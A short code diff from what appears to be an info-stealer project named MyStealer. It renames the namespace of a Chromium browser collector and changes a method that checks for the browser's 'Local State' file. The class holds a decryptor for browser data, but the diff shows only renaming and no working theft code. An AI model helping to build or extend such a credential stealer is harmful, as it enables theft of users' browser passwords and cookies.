@@ -7,7 +7,7 @@ using System.Data.SQLite;
 using System.IO;
 using System.Text;
 
-namespace MyStealer.Modules.Browser
+namespace MyStealer.Collectors.Browser
 {
     internal class Chromium : IBrowserCollector
     {
@@ -18,7 +18,7 @@ namespace MyStealer.Modules.Browser
         private ChromiumDecryptor decryptor;
         private ISet<string> profileNameList;
 
-        public bool Check() => File.Exists(Path.Combine(UserDataPath, "Local State"));
+        public bool IsAvailable() => File.Exists(Path.Combine(UserDataPath, "Local State"));
 
         public void Initialize()
         {
